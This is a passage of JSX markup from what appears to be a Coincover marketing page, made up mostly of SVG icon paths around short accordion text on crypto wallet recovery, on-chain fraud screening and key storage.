                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="#0E171B"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_78641">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                          <svg
                                            className="icon-minus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_73497)">
                                              <path
                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="white"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_73497">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                        </div>
                                      </div>
                                      <div className="accordion-body">
                                        <h6>
                                          Make sure customers can regain access
                                          to their wallets
                                        </h6>
                                        <p>
                                          Losing a wallet key means losing the
                                          crypto inside. Unthinkable.
                                        </p>
                                        <p>
                                          If the worst happens, we help restore
                                          your customers’ wallet access, quickly
                                          and easily.
                                        </p>
                                        <p>&nbsp;</p>
                                        <div className="btn-wrapper">
                                          <a
                                            className="blue_btn_with_arrow"
                                            href="https://www.coincover.com/products/recover"
                                          >
                                            <span>Learn More</span>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-9 dnd-section dnd_area-row-4-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-10 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079945688"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="two_column_accordion_main_wrapper ts">
                              <div className="content-wrapper">
                                <div className="two_column_accordion_wrapper">
                                  <div className="heading">
                                    <h2>
                                      Holistic protection for digital asset
                                      institutions
                                    </h2>
                                  </div>
                                  <div className="accordion-container desktop">
                                    <div className="accordion-column1">
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 35C15 36.1046 14.1046 37 13 37C11.8954 37 11 36.1046 11 35C11 33.8954 11.8954 33 13 33C14.1046 33 15 33.8954 15 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 46C4 47.1046 3.10457 48 2 48C0.895432 48 0 47.1046 0 46C0 44.8954 0.895432 44 2 44C3.10457 44 4 44.8954 4 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 13C26 14.1046 25.1046 15 24 15C22.8954 15 22 14.1046 22 13C22 11.8954 22.8954 11 24 11C25.1046 11 26 11.8954 26 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 13C48 14.1046 47.1046 15 46 15C44.8954 15 44 14.1046 44 13C44 11.8954 44.8954 11 46 11C47.1046 11 48 11.8954 48 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 24C26 25.1046 25.1046 26 24 26C22.8954 26 22 25.1046 22 24C22 22.8954 22.8954 22 24 22C25.1046 22 26 22.8954 26 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 35C26 36.1046 25.1046 37 24 37C22.8954 37 22 36.1046 22 35C22 33.8954 22.8954 33 24 33C25.1046 33 26 33.8954 26 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 68C26 69.1046 25.1046 70 24 70C22.8954 70 22 69.1046 22 68C22 66.8954 22.8954 66 24 66C25.1046 66 26 66.8954 26 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 2C37 3.10457 36.1046 4 35 4C33.8954 4 33 3.10457 33 2C33 0.895431 33.8954 0 35 0C36.1046 0 37 0.895431 37 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 68C37 69.1046 36.1046 70 35 70C33.8954 70 33 69.1046 33 68C33 66.8954 33.8954 66 35 66C36.1046 66 37 66.8954 37 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 35C48 36.1046 47.1046 37 46 37C44.8954 37 44 36.1046 44 35C44 33.8954 44.8954 33 46 33C47.1046 33 48 33.8954 48 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 68C48 69.1046 47.1046 70 46 70C44.8954 70 44 69.1046 44 68C44 66.8954 44.8954 66 46 66C47.1046 66 48 66.8954 48 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 35C59 36.1046 58.1046 37 57 37C55.8954 37 55 36.1046 55 35C55 33.8954 55.8954 33 57 33C58.1046 33 59 33.8954 59 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 46C70 47.1046 69.1046 48 68 48C66.8954 48 66 47.1046 66 46C66 44.8954 66.8954 44 68 44C69.1046 44 70 44.8954 70 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We protect against on-chain fraud
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2957_81097)">
                                                <path
                                                  d="M27.0156 36.5172C27.0156 35.98 27.448 35.5345 27.9984 35.5345C28.5356 35.5345 28.9811 35.98 28.9811 36.5172C28.9811 37.0676 28.5356 37.5 27.9984 37.5C27.448 37.5 27.0156 37.0676 27.0156 36.5172ZM27.0156 32.2586C27.0156 31.7214 27.448 31.2759 27.9984 31.2759C28.5356 31.2759 28.9811 31.7214 28.9811 32.2586C28.9811 32.7959 28.5356 33.2414 27.9984 33.2414C27.448 33.2414 27.0156 32.7959 27.0156 32.2586ZM27.0156 28C27.0156 27.4628 27.448 27.0172 27.9984 27.0172C28.5356 27.0172 28.9811 27.4628 28.9811 28C28.9811 28.5372 28.5356 28.9828 27.9984 28.9828C27.448 28.9828 27.0156 28.5372 27.0156 28ZM27.0156 23.7414C27.0156 23.2041 27.448 22.7586 27.9984 22.7586C28.5356 22.7586 28.9811 23.2041 28.9811 23.7414C28.9811 24.2786 28.5356 24.7241 27.9984 24.7241C27.448 24.7241 27.0156 24.2786 27.0156 23.7414ZM27.0156 19.4828C27.0156 18.9455 27.448 18.5 27.9984 18.5C28.5356 18.5 28.9811 18.9455 28.9811 19.4828C28.9811 20.02 28.5356 20.4655 27.9984 20.4655C27.448 20.4655 27.0156 20.02 27.0156 19.4828Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2957_81097">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <rect
                                                x="0.5"
                                                y="0.5"
                                                width={55}
                                                height={55}
                                                rx="27.5"
                                                stroke="#3939EF"
                                                strokeDasharray="3 3"
                                              />
                                              <g clipPath="url(#clip0_2676_142155)">
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2676_142155">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          Our advanced fraud screening checks
                                          outbound transactions for malicious
                                          activity. To safeguard your accounts,
                                          and your customers’ accounts.{" "}
                                        </div>
                                      </div>
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 2C15 3.10457 14.1046 4 13 4C11.8954 4 11 3.10457 11 2C11 0.895431 11.8954 0 13 0C14.1046 0 15 0.895431 15 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 13C4 14.1046 3.10457 15 2 15C0.895432 15 0 14.1046 0 13C0 11.8954 0.895432 11 2 11C3.10457 11 4 11.8954 4 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 24C4 25.1046 3.10457 26 2 26C0.895432 26 0 25.1046 0 24C0 22.8954 0.895432 22 2 22C3.10457 22 4 22.8954 4 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 35C4 36.1046 3.10457 37 2 37C0.895432 37 0 36.1046 0 35C0 33.8954 0.895432 33 2 33C3.10457 33 4 33.8954 4 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 46C4 47.1046 3.10457 48 2 48C0.895432 48 0 47.1046 0 46C0 44.8954 0.895432 44 2 44C3.10457 44 4 44.8954 4 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 2C59 3.10457 58.1046 4 57 4C55.8954 4 55 3.10457 55 2C55 0.895431 55.8954 0 57 0C58.1046 0 59 0.895431 59 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 13C70 14.1046 69.1046 15 68 15C66.8954 15 66 14.1046 66 13C66 11.8954 66.8954 11 68 11C69.1046 11 70 11.8954 70 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 24C70 25.1046 69.1046 26 68 26C66.8954 26 66 25.1046 66 24C66 22.8954 66.8954 22 68 22C69.1046 22 70 22.8954 70 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 35C70 36.1046 69.1046 37 68 37C66.8954 37 66 36.1046 66 35C66 33.8954 66.8954 33 68 33C69.1046 33 70 33.8954 70 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 46C70 47.1046 69.1046 48 68 48C66.8954 48 66 47.1046 66 46C66 44.8954 66.8954 44 68 44C69.1046 44 70 44.8954 70 46Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>We keep wallet keys secure</h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2957_81097)">
                                                <path
                                                  d="M27.0156 36.5172C27.0156 35.98 27.448 35.5345 27.9984 35.5345C28.5356 35.5345 28.9811 35.98 28.9811 36.5172C28.9811 37.0676 28.5356 37.5 27.9984 37.5C27.448 37.5 27.0156 37.0676 27.0156 36.5172ZM27.0156 32.2586C27.0156 31.7214 27.448 31.2759 27.9984 31.2759C28.5356 31.2759 28.9811 31.7214 28.9811 32.2586C28.9811 32.7959 28.5356 33.2414 27.9984 33.2414C27.448 33.2414 27.0156 32.7959 27.0156 32.2586ZM27.0156 28C27.0156 27.4628 27.448 27.0172 27.9984 27.0172C28.5356 27.0172 28.9811 27.4628 28.9811 28C28.9811 28.5372 28.5356 28.9828 27.9984 28.9828C27.448 28.9828 27.0156 28.5372 27.0156 28ZM27.0156 23.7414C27.0156 23.2041 27.448 22.7586 27.9984 22.7586C28.5356 22.7586 28.9811 23.2041 28.9811 23.7414C28.9811 24.2786 28.5356 24.7241 27.9984 24.7241C27.448 24.7241 27.0156 24.2786 27.0156 23.7414ZM27.0156 19.4828C27.0156 18.9455 27.448 18.5 27.9984 18.5C28.5356 18.5 28.9811 18.9455 28.9811 19.4828C28.9811 20.02 28.5356 20.4655 27.9984 20.4655C27.448 20.4655 27.0156 20.02 27.0156 19.4828Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2957_81097">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <rect
                                                x="0.5"
                                                y="0.5"
                                                width={55}
                                                height={55}
                                                rx="27.5"
                                                stroke="#3939EF"
                                                strokeDasharray="3 3"
                                              />
                                              <g clipPath="url(#clip0_2676_142155)">
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2676_142155">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We provide hot and cold storage
                                          solutions, so you can choose which
                                          suits you best. We can also help you
                                          decide which is right for you.{" "}
                                        </div>
                                      </div>
                                    </div>
                                    <div className="accordion-column1">
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 2C15 3.10457 14.1046 4 13 4C11.8954 4 11 3.10457 11 2C11 0.895431 11.8954 0 13 0C14.1046 0 15 0.895431 15 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 13C15 14.1046 14.1046 15 13 15C11.8954 15 11 14.1046 11 13C11 11.8954 11.8954 11 13 11C14.1046 11 15 11.8954 15 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 57C15 58.1046 14.1046 59 13 59C11.8954 59 11 58.1046 11 57C11 55.8954 11.8954 55 13 55C14.1046 55 15 55.8954 15 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 13C4 14.1046 3.10457 15 2 15C0.895432 15 0 14.1046 0 13C0 11.8954 0.895432 11 2 11C3.10457 11 4 11.8954 4 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 2C59 3.10457 58.1046 4 57 4C55.8954 4 55 3.10457 55 2C55 0.895431 55.8954 0 57 0C58.1046 0 59 0.895431 59 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 13C59 14.1046 58.1046 15 57 15C55.8954 15 55 14.1046 55 13C55 11.8954 55.8954 11 57 11C58.1046 11 59 11.8954 59 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 57C59 58.1046 58.1046 59 57 59C55.8954 59 55 58.1046 55 57C55 55.8954 55.8954 55 57 55C58.1046 55 59 55.8954 59 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 13C70 14.1046 69.1046 15 68 15C66.8954 15 66 14.1046 66 13C66 11.8954 66.8954 11 68 11C69.1046 11 70 11.8954 70 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We shape security around your needs
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2957_81097)">
                                                <path
                                                  d="M27.0156 36.5172C27.0156 35.98 27.448 35.5345 27.9984 35.5345C28.5356 35.5345 28.9811 35.98 28.9811 36.5172C28.9811 37.0676 28.5356 37.5 27.9984 37.5C27.448 37.5 27.0156 37.0676 27.0156 36.5172ZM27.0156 32.2586C27.0156 31.7214 27.448 31.2759 27.9984 31.2759C28.5356 31.2759 28.9811 31.7214 28.9811 32.2586C28.9811 32.7959 28.5356 33.2414 27.9984 33.2414C27.448 33.2414 27.0156 32.7959 27.0156 32.2586ZM27.0156 28C27.0156 27.4628 27.448 27.0172 27.9984 27.0172C28.5356 27.0172 28.9811 27.4628 28.9811 28C28.9811 28.5372 28.5356 28.9828 27.9984 28.9828C27.448 28.9828 27.0156 28.5372 27.0156 28ZM27.0156 23.7414C27.0156 23.2041 27.448 22.7586 27.9984 22.7586C28.5356 22.7586 28.9811 23.2041 28.9811 23.7414C28.9811 24.2786 28.5356 24.7241 27.9984 24.7241C27.448 24.7241 27.0156 24.2786 27.0156 23.7414ZM27.0156 19.4828C27.0156 18.9455 27.448 18.5 27.9984 18.5C28.5356 18.5 28.9811 18.9455 28.9811 19.4828C28.9811 20.02 28.5356 20.4655 27.9984 20.4655C27.448 20.4655 27.0156 20.02 27.0156 19.4828Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2957_81097">
                                                  <rect
